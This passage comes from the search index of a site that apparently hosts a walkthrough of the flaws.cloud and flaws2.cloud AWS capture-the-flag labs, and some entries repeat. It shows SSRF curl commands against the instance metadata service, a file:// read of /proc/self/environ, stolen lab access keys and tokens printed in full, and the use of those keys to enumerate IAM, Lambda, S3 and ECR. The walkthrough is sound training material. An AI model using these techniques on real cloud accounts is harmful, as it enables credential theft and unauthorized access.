http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/ http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/ See if you can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it. By leveraging the proxy on the target EC2, we are able to force the server to issue a request to host under our control. This is more-or-less equivalent to a server-side-request-forgery (SSRF) attack. SSRFs are known to be particularly impactful in cloud environments due to the presence of the internal metadata service (IMDS) running by default on every compute instance (AWS, GCP, Azure, etc.). This service is generally accessible at a fixed IP address 169.254.169.254 , let's verify that: fog@cloudbreach:~/flaws/level5$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/hostname ip-172-31-41-84.us-west-2.compute.internal Most importantly, the IMDS service sometimes allows access to sensitive access keys. fog@cloudbreach:~/flaws/level5$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws { \"Code\" : \"Success\", \"LastUpdated\" : \"2022-12-13T07:20:49Z\", \"Type\" : \"AWS-HMAC\", \"AccessKeyId\" : \"ASIA**************XQ\", \"SecretAccessKey\" : \"gH5H********************************rjmy\", \"Token\" : \"IQotuGdtSdxNiGtGsfPrY\", \"Expiration\" : \"2022-12-13T13:22:40Z\" } We just need to create another profile and import the stolen keys in our environment to see if can do anything with them. Warning Temporary (AWS STS) access key IDs - as denoted by the ASIA prefix in the AccessKeyId field - require to add an extra field in the aws profile configuration file: # cat ~/.aws/credentials [level6] aws_access_key_id = <AccessKeyId> aws_secret_access_key = <SecretAccessKey> aws_session_token = <Token> fog@cloudbreach:~/flaws/level6$ aws s3 sync s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ . --profile level6 fog@cloudbreach:~/flaws/level6$ ll total 16 drwxrwxr-x 3 fog fog 4096 Dec 8 22:10 ./ drwxrwxr-x 8 fog fog 4096 Dec 13 03:18 ../ drwxrwxr-x 2 fog fog 4096 Dec 8 22:10 ddcc78ff/ -rw-rw-r-- 1 fog fog 871 Feb 26 2017 index.html","title":"Level 5 - SSRF on AWS Metadata Service"},{"location":"aws/training_labs/flaws/#level-6-exploiting-aws-lambda-functions","text":"Objective For this final challenge, you're getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account. Access key ID: AKIAJFQ6E7BY57Q3OBGA Secret: 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 Let's enumerate information about our current user. First question we ask ourselves is whether we have any kind of inline policies associated to us: fog@cloudbreach:~/flaws/level6$ aws iam list-user-policies --user-name Level6 --profile level6 { \"PolicyNames\": [] } What about attached policies? fog@cloudbreach:~/flaws/level6$ aws iam list-attached-user-policies --user-name Level6 --profile level6 { \"AttachedPolicies\": [ { \"PolicyName\": \"MySecurityAudit\", \"PolicyArn\": \"arn:aws:iam::975426262029:policy/MySecurityAudit\" }, { \"PolicyName\": \"list_apigateways\", \"PolicyArn\": \"arn:aws:iam::975426262029:policy/list_apigateways\" } ] } As suggested by the level description, we do have an attached policy called MySecurityAudit but also list_apigateways . What can we do with those? Tip To retrieve a managed policy document that is attached to a user, use GetPolicy to determine the policy's default version. Then use GetPolicyVersion to retrieve the policy document. aws iam get_policy --policy-arn <policy_arn> aws iam get_policy_version --policy-arn <policy_arn> --policy-id <policy_version> https://docs.aws.amazon.com/cli/latest/reference/iam/get-user-policy.html#description fog@cloudbreach:~/flaws/level6$ aws iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --profile level6 { \"Policy\": { \"PolicyName\": \"list_apigateways\", \"PolicyId\": \"ANPAIRLWTQMGKCSPGTAIO\", \"Arn\": \"arn:aws:iam::975426262029:policy/list_apigateways\", \"Path\": \"/\", \"DefaultVersionId\": \"v4\", \"AttachmentCount\": 1, \"PermissionsBoundaryUsageCount\": 0, \"IsAttachable\": true, \"Description\": \"List apigateways\", \"CreateDate\": \"2017-02-20T01:45:17Z\", \"UpdateDate\": \"2017-02-20T01:48:17Z\", \"Tags\": [] } } fog@cloudbreach:~/flaws/level6$ aws iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4 --profile level6 { \"PolicyVersion\": { \"Document\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": [ \"apigateway:GET\" ], \"Effect\": \"Allow\", \"Resource\": \"arn:aws:apigateway:us-west-2::/restapis/*\" } ] }, \"VersionId\": \"v4\", \"IsDefaultVersion\": true, \"CreateDate\": \"2017-02-20T01:48:17Z\" } } Tip Lambda functions are called using a combination of: rest-api-id -> e.g: s33ppypa75 stage-name -> e.g: Prod region -> e.g: us-west-2 and resource -> e.g: level6 Functions call be triggered by visiting URLs formed as: https://<rest-api-id>.execute-api.<region>.amazonaws.com/<stage-name>/<resource> fog@cloudbreach:~/flaws/level6$ aws lambda get-policy --function-name Level6 --profile flaws-level6 --region us-west-2 { \"Policy\": \"{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Id\\\":\\\"default\\\",\\\"Statement\\\":[{\\\"Sid\\\":\\\"904610a93f593b76ad66ed6ed82c0a8b\\\",\\\"Effect\\\":\\\"Allow\\\",\\\"Principal\\\":{\\\"Service\\\":\\\"apigateway.amazonaws.com\\\"},\\\"Action\\\":\\\"lambda:InvokeFunction\\\",\\\"Resource\\\":\\\"arn:aws:lambda:us-west-2:975426262029:function:Level6\\\",\\\"Condition\\\":{\\\"ArnLike\\\":{\\\"AWS:SourceArn\\\":\\\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\\\"}}}]}\", \"RevisionId\": \"98033dfd-defa-41a8-b820-1f20add9c77b\" } fog@cloudbreach:~/flaws/level6$ aws apigateway get-stages --rest-api-id s33ppypa75 --profile level6 --region us-west-2 { \"item\": [ { \"deploymentId\": \"8gppiv\", \"stageName\": \"Prod\", \"cacheClusterEnabled\": false, \"cacheClusterStatus\": \"NOT_AVAILABLE\", \"methodSettings\": {}, \"tracingEnabled\": false, \"createdDate\": 1488155168, \"lastUpdatedDate\": 1488155168 } ] } https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6","title":"Level 6 - Exploiting AWS Lambda Functions"},{"location":"aws/training_labs/flaws2/","text":"Flaws II Link to Challenge: flaws2.cloud Credits: @0xdabbad00 Level 1 - Exposed environment variables through Lambda function Objective For this level, you'll need to enter the correct PIN code. The correct PIN is 100 digits long, so brute forcing it won't help. Error, malformed input {\"AWS_LAMBDA_FUNCTION_VERSION\":\"$LATEST\",\"AWS_LAMBDA_INITIALIZATION_TYPE\":\"on-demand\",\"LD_LIBRARY_PATH\":\"/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib\",\"AWS_LAMBDA_LOG_STREAM_NAME\":\"2022/12/15/[$LATEST]90366030bb464441a68998b9127eef29\",\"AWS_LAMBDA_FUNCTION_MEMORY_SIZE\":\"128\",\"PATH\":\"/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin\",\"AWS_SECRET_ACCESS_KEY\":\"K8FP2Wqpa/ENwU8iHqLaWHRA65MOq9qdq6zq0hhs\",\"LANG\":\"en_US.UTF-8\",\"_AWS_XRAY_DAEMON_ADDRESS\":\"169.254.79.129\",\"AWS_XRAY_DAEMON_ADDRESS\":\"169.254.79.129:2000\",\"AWS_ACCESS_KEY_ID\":\"ASIAZQNB3KHGKTT3RYD6\",\"AWS_SESSION_TOKEN\":\"IQoJb3JpZ2luX2VjEMH//////////wEaCXVzLWVhc3QtMSJIMEYCIQDeBPPM9vqZ8r4upGQesMpWFRkDxFxi8p31j2B9JOB4OgIhAJnO1RACf3MHXtFHiAXzut37wg7hTnnEQy3NQ1JuA83EKukCCOr//////////wEQAxoMNjUzNzExMzMxNzg4IgyrCzLK3Tc3dn+NtdYqvQKdwmBYEjZ0+3H5bCpuIzUvkX9IUIioiIdAiUu/7PKgUbNPXRE+9WMQ0xAAjGjKm6nqMXbxCUuuMgJvAtpaESbyLxdW9mfZG5rf+TIIqHsUNw//wCjEMh5eTdwgtuJB17DWiyuyOTl6KXlnHghlcErs1gDXCs6WaJ2+zO0McBdQlbQ2aPnJYIS/haLPXJz1eCRQ5Gv7Pe72DyYRmf8bTeDTyU8cNEKa193uSylTmzHa5m238iJ6Z1wPYNR8K5U26zbJy3xxZr2s+o+EufZUj/C3WjxWuFXTPJxDzdOpMpbEQUHUrT5vBckcx7DLxCyIVF9dM8vpXyjTIQC269xgJ2opZv2fRAL8mc/n7bJlkkUew4zDnAn1jPqpO3maV2ifAnLKdKfjWc3LDwNyiLk7ZBE+icc2RFVWPL8RdV5/OzDOu+ucBjqdAfgbCdVtkLSBKOabiVp7DjU6Ek1MMauFeCaSTM6CJqT9xskry/qBiCMGHchOloCY2/RULl/lA3tS9cf/es71k5dQRWdqwkmqvYI/5iZMRSd5Bj+9JJuYKJXI5h9n5DYFWL4c9elu9HehWwZnL4Qs9Vtfl9hDUDY6fc1+998jjTbAPs5TnOLDghZTYarc34Nd14El5t9JcFkNheK+lbA=\",\"LAMBDA_RUNTIME_DIR\":\"/var/runtime\",\"_AWS_XRAY_DAEMON_PORT\":\"2000\",\"AWS_REGION\":\"us-east-1\",\"AWS_DEFAULT_REGION\":\"us-east-1\",\"_HANDLER\":\"index.handler\",\"AWS_LAMBDA_LOG_GROUP_NAME\":\"/aws/lambda/level1\",\"AWS_EXECUTION_ENV\":\"AWS_Lambda_nodejs8.10\",\"TZ\":\":UTC\",\"AWS_LAMBDA_FUNCTION_NAME\":\"level1\",\"AWS_LAMBDA_RUNTIME_API\":\"127.0.0.1:9001\",\"AWS_XRAY_CONTEXT_MISSING\":\"LOG_ERROR\",\"LAMBDA_TASK_ROOT\":\"/var/task\",\"NODE_PATH\":\"/opt/nodejs/node8/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task:/var/runtime/node_modules\",\"_X_AMZN_TRACE_ID\":\"Root=1-639ae1e9-5cd0a30149fb59526795ddcd;Parent=1884fb2965de9ad2;Sampled=0\"} function validateForm () { var code = document . forms [ \"myForm\" ][ \"code\" ]. value ; if ( ! ( ! isNaN ( parseFloat ( code )) && isFinite ( code ))) { alert ( \"Code must be a number\" ); return false ; } } x9sByb69uZ3Qipwx61jqpSOdizhGGLk5JytiUVy2 < form name = \"myForm\" action = \"https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1\" onsubmit = \"return validateForm()\" > The lambda function debugging message will contain environment variables used by the instance: \"AWS_ACCESS_KEY_ID\":\"ASIAZQNB3KHGKTT3RYD6\" \"AWS_SECRET_ACCESS_KEY\":\"K8FP2Wqpa/ENwU8iHqLaWHRA65MOq9qdq6zq0hhs\" \"AWS_SESSION_TOKEN\":\"IQoJb3JpZ2luX2VjEMH//////////wEaCXVzLWVhc3QtMSJIMEYCIQDeBPPM9vqZ8r4upGQesMpWFRkDxFxi8p31j2B9JOB4OgIhAJnO1RACf3MHXtFHiAXzut37wg7hTnnEQy3NQ1JuA83EKukCCOr//////////wEQAxoMNjUzNzExMzMxNzg4IgyrCzLK3Tc3dn+NtdYqvQKdwmBYEjZ0+3H5bCpuIzUvkX9IUIioiIdAiUu/7PKgUbNPXRE+9WMQ0xAAjGjKm6nqMXbxCUuuMgJvAtpaESbyLxdW9mfZG5rf+TIIqHsUNw//wCjEMh5eTdwgtuJB17DWiyuyOTl6KXlnHghlcErs1gDXCs6WaJ2+zO0McBdQlbQ2aPnJYIS/haLPXJz1eCRQ5Gv7Pe72DyYRmf8bTeDTyU8cNEKa193uSylTmzHa5m238iJ6Z1wPYNR8K5U26zbJy3xxZr2s+o+EufZUj/C3WjxWuFXTPJxDzdOpMpbEQUHUrT5vBckcx7DLxCyIVF9dM8vpXyjTIQC269xgJ2opZv2fRAL8mc/n7bJlkkUew4zDnAn1jPqpO3maV2ifAnLKdKfjWc3LDwNyiLk7ZBE+icc2RFVWPL8RdV5/OzDOu+ucBjqdAfgbCdVtkLSBKOabiVp7DjU6Ek1MMauFeCaSTM6CJqT9xskry/qBiCMGHchOloCY2/RULl/lA3tS9cf/es71k5dQRWdqwkmqvYI/5iZMRSd5Bj+9JJuYKJXI5h9n5DYFWL4c9elu9HehWwZnL4Qs9Vtfl9hDUDY6fc1+998jjTbAPs5TnOLDghZTYarc34Nd14El5t9JcFkNheK+lbA=\" We can import those in a profile using aws configure --profile level1 , remember to add the session token as part of the credential config: Warning Temporary (AWS STS) access key IDs - as denoted by the ASIA prefix in the AccessKeyId field - require to add an extra field in the aws profile configuration file: # cat ~/.aws/credentials [level1] aws_access_key_id = <AccessKeyId> aws_secret_access_key = <SecretAccessKey> aws_session_token = <Token> As usual after obtaining new keys, we perform basic enumeration: fog@cloudbreach:~$ aws sts get-caller-identity --profile flaws2-level1 { \"UserId\": \"AROAIBATWWYQXZTTALNCE:level1\", \"Account\": \"653711331788\", \"Arn\": \"arn:aws:sts::653711331788:assumed-role/level1/level1\" } We don't seem to be able to have the right policies (privileges) to use any iam function, but we can list the contents of the S3 bucket located at level1.flaws2.cloud : fog@cloudbreach:~/flaws_2$ aws s3 ls level1.flaws2.cloud --profile flaws2-level1 PRE img/ 2018-11-20 15:55:05 17102 favicon.ico 2018-11-20 21:00:22 1905 hint1.htm 2018-11-20 21:00:22 2226 hint2.htm 2018-11-20 21:00:22 2536 hint3.htm 2018-11-20 21:00:23 2460 hint4.htm 2018-11-20 21:00:17 3000 index.htm 2018-11-20 21:00:17 1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html Visiting secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html leads us to the next level . Level 2 - Elastic Container Registries (ECR) Objective This next level is running as a container at http://container.target.flaws2.cloud/ Just like S3 buckets, other resources on AWS can have open permissions. I'll give you a hint that the ECR (Elastic Container Registry) is named \"level2\". fog@cloudbreach:~/flaws_2$ aws ecr list-images --repository-name level2 --profile flaws2-level1 { \"imageIds\": [ { \"imageDigest\": \"sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e\", \"imageTag\": \"latest\" } ] } https://653711331788.dkr.ecr.us-east-1.amazonaws.com docker login -u AWS -p eyJwYXlsb2FkIjoibWhjK3BHc043T1ZSSEQ0aHo3L1c3RU4yT2MyL3Iyd08rQ3dvZXcwKzRabTByMkZnVDBMeDZDTHBwZW50cnlWLytJN3F2YjRiMGM4OWxpTm9RVmp3aEpUS0tlTGVkR3lQa3ZpMjY3MVhjWjc0OFFTa25TY2YzcWdTTmwzcUtuQjU0REZGaTV4NE9rV3o1bnBEbytDazV5TE1aTzgzOVMxc2szY1FXR1I5OWZ5YUFOanpmaHVrbmZIMTRIT0pZMWx2RHlXTWVBdkNSQUd6OUM4UGc1STAzcVRiUERvNDlEa2V3NVNKeTVnUWlJNDQwaldKUTh0UWRSalMvblF5U2JrNzVFLzdXcE1zNHhtdzVtU2ZXTnp3eDFmRGdLSFlGeVVyMVU4WFpTemMyN1VFUE1BWi9qYlFFU3U5L243Q3RwWnlPemxqN3V4a0VYSnQyakNFdGFjNHZKb0JFNWF5dkFlQ3pUdzc0OVlDbll5a2pHbmRpUzJ6a1RZYkl5K0IwbDVVR0h5S0cvc2xYdUxJVkpSTHNkUTBlV0hUVU5sRmJTSHJHSUZYMmZTbnMzSUoreW1uTnR0TlNrdG1QWGZSMXhjWElVRmc2bXI4OTI2VUdLMG5kVFdFUHNGRmxYeUdvMHNvc3JsUmlxTVVKMlpjMStBN2lLWkFpZk1BZU5iN0ZpTWpPNjdnNTdQckExUjdCVmpXbjdHU1NWdGxpT1Rsc1dyM3BBcmtBMHZKYzFJT2JOaDZVNDY3a2tqWkNDaEZUaEJQcVVQRlgvWWNtNUkyb2d0VzRIKzRhMGRlbnZkQytCT2VUbVNFZVVYNTRyclpwSWNKSVBFdFFPOTJZaFJ0ajVReE9OZnZWQUJYd1hqanJvK1B4RVNiUE9JYktnRG1ISGZZMWhibTdSTWRuYk5ZM3p4T2NOYUFQYjBnSjNHUjNpWUNScjFEOFZuUUE2eTNlOEJHZ2xNRUxKZ2tSMDN5akRBdVpGOEwwVE82VjFhSWhZaE1nYzBoQXpWc2VDdHJLZ0VsdVFxWmxvYWJFeStWWFBPYy9uQytDcTQ3VmpXdGZxN1c2bGRNblFORUpibG1zZEF1WW0yL28yQUVqZW42eWJ5SndNVXZHZ3lRTi9CS0FnMnRMb1Jsb1RXbTNBNUY1Slk0N3YxRm11Q3g4b1lGVldUaU4yMStwU1lSNHpsZ0hteFlRMkY0MDBtMFFMWXFJYU04U1J1M2hkVXRRNW1wSG45SjdvTUhXckZRSHhIK1lzUmlxenVlanN0ZmRzd2lqRUgyLzRyUU9pVk9CclkvQ0hBNHR1YmpqcEtwWXFWVnlPZEtIMXV4Slh1eVBTcHRwSFZlZWc2RTR1T1pVN3dKQzhGNGhMRC9SVFJnWnR6MzhFRXZ3WkEyYWlWMVRORVJsdnI0VUhWUmt2dFUydUl5SlY0MGt0eEVkMEh3cXp6L09sWnpMS1VwbHVkaEZMcjBEVDhMT3AxYkljMTlwU0NLelJVVlBFQThiY0x6UlltZURPakNhc1FNY3pSNi9TK1ZoUXA1M0FCUTNPbHdjMWhER0VzTVdyUXZERVRjQ2dvTXQ3U2F5SSs5V3ZDR01hOFdSQ3RPTFlSSjNONE1MaEdYNm4rVXdQTDloRmt3c0piREgzTTNPYS9NRmR2ZFJZR01JYzJzODgxMWtTM0xYUFVka1J3S25NTkkxYWppcjlTL1ZCUlJ2a2tQOFVSOE42UXJzN291ODY5RGxoSTBXTzZFOWdGcDJNZXY3Yks2M3ByMXBkODBBZ1RVWGF0WlVFWkhKUCtpeEI0SGl6STNmTXVLRjRTaC82MVRjdytUa0hDUkVmWVFiWHFTM0gwPSIsImRhdGFrZXkiOiJBUUVCQUhod20wWWFJU0plUnRKbTVuMUc2dXFlZWtYdW9YWFBlNVVGY2U5UnE4LzE0d0FBQUg0d2ZBWUpLb1pJaHZjTkFRY0dvRzh3YlFJQkFEQm9CZ2txaGtpRzl3MEJCd0V3SGdZSllJWklBV1VEQkFFdU1CRUVEQ05JUGdhVk1qamJvWEF1SkFJQkVJQTdMUFlKWGdvaGw0dW5aZjBwUmVUR1lLUUIwbW5YM1E4d3hBVU5KSE1QY2syQ2dGL2hBQ2NmQlhXaEU5SHNDc3hmUms3SFB5akFEaGlGZjgwPSIsInZlcnNpb24iOiIyIiwidHlwZSI6IkRBVEFfS0VZIiwiZXhwaXJhdGlvbiI6MTY3MTIwMTg1OX0= -e none https://653711331788.dkr.ecr.us-east-1.amazonaws.com docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/ root@9c7df3e509cf:/var/www/html# ll total 24 drwxr-xr-x 1 root root 4096 Nov 27 2018 ./ drwxr-xr-x 1 root root 4096 Nov 27 2018 ../ -rw-r--r-- 1 root root 1890 Nov 26 2018 index.htm -rw-r--r-- 1 root root 612 Nov 27 2018 index.nginx-debian.html -rw-r--r-- 1 root root 614 Nov 27 2018 proxy.py -rw-r--r-- 1 root root 49 Nov 26 2018 start.sh root@9c7df3e509cf:/var/www/html# grep 'level3' -R . ./index.htm: Read about Level 3 at <a href=\"http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud\">level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud</a> Level 3 - Stealing Keys from ECR Metadata Service via SSRF Objective The container's webserver you got access to includes a simple proxy that can be access with: http://container.target.flaws2.cloud/proxy/http://flaws.cloud or http://container.target.flaws2.cloud/proxy/http://neverssl.com HOSTNAME=e7393d8eefbb sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621 proxy/file:///proc/self/environ { \"RoleArn\" : \"arn:aws:iam::653711331788:role/level3\" , \"AccessKeyId\" : \"ASIAZQNB3KHGKBJ23GKX\" , \"SecretAccessKey\" : \"NeTGQ4KXuVgpAvifwSbu89c5P2t+U2jqOhUmMGz9\" , \"Token\" : \"IQoJb3JpZ2luX2VjENL//////////wEaCXVzLWVhc3QtMSJHMEUCIQCxXCTsNKHsAz3O2N/Oxnc6yfWfMfhQCxxJyHZulaa1mQIgesLI6mu177DObNIJu7xAnCwLqOpClBXWgmHI1wQcEO0q7AMI+///////////ARADGgw2NTM3MTEzMzE3ODgiDIq+ivyr8Ofng2tMxCrAAyC8jldxrR4gRfqb+Tv/u5WRu/Mjafm6Q8S5M8Kykn9fiKF3sBGFXZg/2tU+UR0JVQvV8gyeoAnIK5F8P5WLOXcEelT+B3ZKmSI5m7o8SIcq1qsTRwMtTOnjLhhVYPVAXPogFMk0ZsVlGSCKoTTjN2dPpSIh4dSSn9nrdG/T9zg+WsA5s9J6VZqFQ6ggym0LGBUpvkAj780IEDs4WNwEqJeO5myChq0kqqcXA5QSFEMPDGu/sZnPVSObrJu/QjPstPF9NEf/4cTZEkW3P01HhfVceQeryJP1RFBnt1Wz0Q4L7DiB2xETA1bJoicsaA3/JcLO2UvPRpqKvClgv0qlBuGlyq9MGtbsd7X1JqdlOLsAspCyuv46aTOeuV3uuAfu6w+T9g0MYEcvqRGgHJG1fUyR9UWWBZwTkx8rnR9kQ9yRHNK117gdYeuLxEsjsT64PzAvATojIlGcrw4eKivv+mrr6O/Sr0SztCv1NajMtoMvYdw9X3iGWwnLUciwypQ+nFOoERlJwXqbP7nvY34YjJcdx2WfzNuT1ie0AtuwLUt9HX5tJyYKsR8kzhrFyUx5eAfv++vNRQcXbpE5Ig9MtoAwnaPvnAY6pQHOC2Snj9DJZVR85prIw1HQImQo+4Nq9TgFHoKR6asdPGYN5jp0VtIW8P/+zSKSXqEZM+ALeTmzbAn1nIbtsNNkYspQL21VeS4wE2hNQlt6PxZnOyRQBEdLCe2IAGDIgzaBg+TD2tZ24bJAMqrPVkF5q+tjf0ai0QE0kqUSV6BSNo248wO0WSEArk4xoxM1eJ4lWGBD70SouvHnLZd7kjcWS4BLRis=\" , \"Expiration\" : \"2022-12-16T08:02:05Z\" } HOSTNAME=ip-172-31-48-55.ec2.internalHOME=/rootAWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/2fdf39e7-50cf-4e11-a47a-533525342c80AWS_EXECUTION_ENV=AWS_ECS_FARGATEAWS_DEFAULT_REGION=us-east-1ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/f6209e98011942c28c1d74f589770aec-3779599274ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/f6209e98011942c28c1d74f589770aec-3779599274PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAWS_REGION=us-east-1PWD=/ /v2/credentials/2fdf39e7-50cf-4e11-a47a-533525342c80 fog@cloudbreach:~/flaws_2/level3$ aws s3 ls --profile flaws2-level3 2018-11-20 14:50:08 flaws2.cloud 2018-11-20 13:45:26 level1.flaws2.cloud 2018-11-20 20:41:16 level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud 2018-11-26 14:47:22 level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud 2018-11-27 15:37:27 the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud","title":"Flaws II"},{"location":"aws/training_labs/flaws2/#flaws-ii","text":"Link to Challenge: flaws2.cloud Credits: @0xdabbad00","title":"Flaws II"},{"location":"aws/training_labs/flaws2/#level-1-exposed-environment-variables-through-lambda-function","text":"Objective For this level, you'll need to enter the correct PIN code. The correct PIN is 100 digits long, so brute forcing it won't help. Error, malformed input {\"AWS_LAMBDA_FUNCTION_VERSION\":\"$LATEST\",\"AWS_LAMBDA_INITIALIZATION_TYPE\":\"on-demand\",\"LD_LIBRARY_PATH\":\"/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib\",\"AWS_LAMBDA_LOG_STREAM_NAME\":\"2022/12/15/[$LATEST]90366030bb464441a68998b9127eef29\",\"AWS_LAMBDA_FUNCTION_MEMORY_SIZE\":\"128\",\"PATH\":\"/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin\",\"AWS_SECRET_ACCESS_KEY\":\"K8FP2Wqpa/ENwU8iHqLaWHRA65MOq9qdq6zq0hhs\",\"LANG\":\"en_US.UTF-8\",\"_AWS_XRAY_DAEMON_ADDRESS\":\"169.254.79.129\",\"AWS_XRAY_DAEMON_ADDRESS\":\"169.254.79.129:2000\",\"AWS_ACCESS_KEY_ID\":\"ASIAZQNB3KHGKTT3RYD6\",\"AWS_SESSION_TOKEN\":\"IQoJb3JpZ2luX2VjEMH//////////wEaCXVzLWVhc3QtMSJIMEYCIQDeBPPM9vqZ8r4upGQesMpWFRkDxFxi8p31j2B9JOB4OgIhAJnO1RACf3MHXtFHiAXzut37wg7hTnnEQy3NQ1JuA83EKukCCOr//////////wEQAxoMNjUzNzExMzMxNzg4IgyrCzLK3Tc3dn+NtdYqvQKdwmBYEjZ0+3H5bCpuIzUvkX9IUIioiIdAiUu/7PKgUbNPXRE+9WMQ0xAAjGjKm6nqMXbxCUuuMgJvAtpaESbyLxdW9mfZG5rf+TIIqHsUNw//wCjEMh5eTdwgtuJB17DWiyuyOTl6KXlnHghlcErs1gDXCs6WaJ2+zO0McBdQlbQ2aPnJYIS/haLPXJz1eCRQ5Gv7Pe72DyYRmf8bTeDTyU8cNEKa193uSylTmzHa5m238iJ6Z1wPYNR8K5U26zbJy3xxZr2s+o+EufZUj/C3WjxWuFXTPJxDzdOpMpbEQUHUrT5vBckcx7DLxCyIVF9dM8vpXyjTIQC269xgJ2opZv2fRAL8mc/n7bJlkkUew4zDnAn1jPqpO3maV2ifAnLKdKfjWc3LDwNyiLk7ZBE+icc2RFVWPL8RdV5/OzDOu+ucBjqdAfgbCdVtkLSBKOabiVp7DjU6Ek1MMauFeCaSTM6CJqT9xskry/qBiCMGHchOloCY2/RULl/lA3tS9cf/es71k5dQRWdqwkmqvYI/5iZMRSd5Bj+9JJuYKJXI5h9n5DYFWL4c9elu9HehWwZnL4Qs9Vtfl9hDUDY6fc1+998jjTbAPs5TnOLDghZTYarc34Nd14El5t9JcFkNheK+lbA=\",\"LAMBDA_RUNTIME_DIR\":\"/var/runtime\",\"_AWS_XRAY_DAEMON_PORT\":\"2000\",\"AWS_REGION\":\"us-east-1\",\"AWS_DEFAULT_REGION\":\"us-east-1\",\"_HANDLER\":\"index.handler\",\"AWS_LAMBDA_LOG_GROUP_NAME\":\"/aws/lambda/level1\",\"AWS_EXECUTION_ENV\":\"AWS_Lambda_nodejs8.10\",\"TZ\":\":UTC\",\"AWS_LAMBDA_FUNCTION_NAME\":\"level1\",\"AWS_LAMBDA_RUNTIME_API\":\"127.0.0.1:9001\",\"AWS_XRAY_CONTEXT_MISSING\":\"LOG_ERROR\",\"LAMBDA_TASK_ROOT\":\"/var/task\",\"NODE_PATH\":\"/opt/nodejs/node8/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task:/var/runtime/node_modules\",\"_X_AMZN_TRACE_ID\":\"Root=1-639ae1e9-5cd0a30149fb59526795ddcd;Parent=1884fb2965de9ad2;Sampled=0\"} function validateForm () { var code = document . forms [ \"myForm\" ][ \"code\" ]. value ; if ( ! ( ! isNaN ( parseFloat ( code )) && isFinite ( code ))) { alert ( \"Code must be a number\" ); return false ; } } x9sByb69uZ3Qipwx61jqpSOdizhGGLk5JytiUVy2 < form name = \"myForm\" action = \"https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1\" onsubmit = \"return validateForm()\" > The lambda function debugging message will contain environment variables used by the instance: \"AWS_ACCESS_KEY_ID\":\"ASIAZQNB3KHGKTT3RYD6\" \"AWS_SECRET_ACCESS_KEY\":\"K8FP2Wqpa/ENwU8iHqLaWHRA65MOq9qdq6zq0hhs\" \"AWS_SESSION_TOKEN\":\"IQoJb3JpZ2luX2VjEMH//////////wEaCXVzLWVhc3QtMSJIMEYCIQDeBPPM9vqZ8r4upGQesMpWFRkDxFxi8p31j2B9JOB4OgIhAJnO1RACf3MHXtFHiAXzut37wg7hTnnEQy3NQ1JuA83EKukCCOr//////////wEQAxoMNjUzNzExMzMxNzg4IgyrCzLK3Tc3dn+NtdYqvQKdwmBYEjZ0+3H5bCpuIzUvkX9IUIioiIdAiUu/7PKgUbNPXRE+9WMQ0xAAjGjKm6nqMXbxCUuuMgJvAtpaESbyLxdW9mfZG5rf+TIIqHsUNw//wCjEMh5eTdwgtuJB17DWiyuyOTl6KXlnHghlcErs1gDXCs6WaJ2+zO0McBdQlbQ2aPnJYIS/haLPXJz1eCRQ5Gv7Pe72DyYRmf8bTeDTyU8cNEKa193uSylTmzHa5m238iJ6Z1wPYNR8K5U26zbJy3xxZr2s+o+EufZUj/C3WjxWuFXTPJxDzdOpMpbEQUHUrT5vBckcx7DLxCyIVF9dM8vpXyjTIQC269xgJ2opZv2fRAL8mc/n7bJlkkUew4zDnAn1jPqpO3maV2ifAnLKdKfjWc3LDwNyiLk7ZBE+icc2RFVWPL8RdV5/OzDOu+ucBjqdAfgbCdVtkLSBKOabiVp7DjU6Ek1MMauFeCaSTM6CJqT9xskry/qBiCMGHchOloCY2/RULl/lA3tS9cf/es71k5dQRWdqwkmqvYI/5iZMRSd5Bj+9JJuYKJXI5h9n5DYFWL4c9elu9HehWwZnL